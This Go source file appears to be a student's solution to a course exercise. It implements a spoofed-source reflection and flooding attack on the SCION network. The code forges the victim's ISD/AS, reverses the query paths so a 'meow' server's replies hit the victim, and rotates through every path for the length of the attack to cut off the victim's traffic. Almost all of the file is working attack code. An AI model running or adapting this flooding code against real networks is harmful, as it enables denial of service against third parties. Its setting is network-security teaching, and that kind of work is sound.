package client

import (
	// All of these imports were used for the mastersolution
	// "encoding/json"

	"log"
	"net"

	// "sync" // TODO
	"context"
	"time"

	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	"github.com/scionproto/scion/go/lib/spath"
)

func GenerateAttackPayload() []byte {
	return []byte(`"B"`) // little bit of trolling
}

func Attack(ctx context.Context, meowServerAddr *snet.UDPAddr, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// BEGIN givenstuff
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
		return err
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	sciondAddr, err := SCIONDAddress()
	if err != nil {
		log.Fatal(err)
		return err
	}

	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
		return err
	}
	// END givenstuff

	// querier used to find paths, naturally based in our ISD/AS
	q := daemon.Querier{Connector: sciondConn, IA: meowServerAddr.IA}

	spoofNetwork := snet.NewNetwork(spoofedAddr.IA, dispatcher, daemon.RevHandler{Connector: sciondConn})

	conn, err := spoofNetwork.Dial(ctx, "udp", spoofedAddr.Host, meowServerAddr, addr.SvcNone)

	if err != nil {
		log.Fatal(err)
		return err
	}

	defer conn.Close()

	// TODO: Multicast to both server ports somehow?

	// local case
	// No paths manipulation, try to increase bandwith
	if spoofedAddr.IA == meowServerAddr.IA {
		for start := time.Now(); time.Since(start) < AttackTime; {
			_, err = conn.Write(payload)
			if err != nil {
				log.Fatal(err)
			}
		}

		log.Println("Done attack on local victim")
		return nil
	}

	// remote case
	// Make the next hop explicit, since we've set our spoofNetwork to be in the spoofed ISD/AS
	// Otherwise SCION gets the big confuse
	meowServerAddr.NextHop = &net.UDPAddr{
		IP:   meowServerAddr.Host.IP,
		Port: DispatcherPort,
		Zone: meowServerAddr.Host.Zone,
	}

	// No timeout
	// Get all paths that the server can take to the victim
	pathsServerVictim, err := q.Query(context.Background(), spoofedAddr.IA)

	// Reverse the paths, so that the server, or rather SCION, is fooled that the request originates from the victim
	var reversePaths []spath.Path
	for _, path := range pathsServerVictim {
		p := path.Path()
		p.Reverse()
		reversePaths = append(reversePaths, p)
	}

	// Flood the victim from packets coming from all possible paths,
	// assuming the victim drops a path if it detects malicious activity on it.
	// If all paths are dropped, the victim won't have anywhere to send traffic to/from,
	// effectively dropping communication

	// switch between different paths when sending payload, using a "cyclic" array
	// assures that each path is evenly loaded
	pathNumber := 0
	for start := time.Now(); time.Since(start) < AttackTime; {
		meowServerAddr.Path = reversePaths[pathNumber]
		_, err = conn.WriteTo(payload, meowServerAddr)
		if err != nil {
			log.Fatal(err)
		}
		pathNumber = (pathNumber + 1) % len(reversePaths)
	}

	log.Println("Done attack to remote victim")
	return nil
}
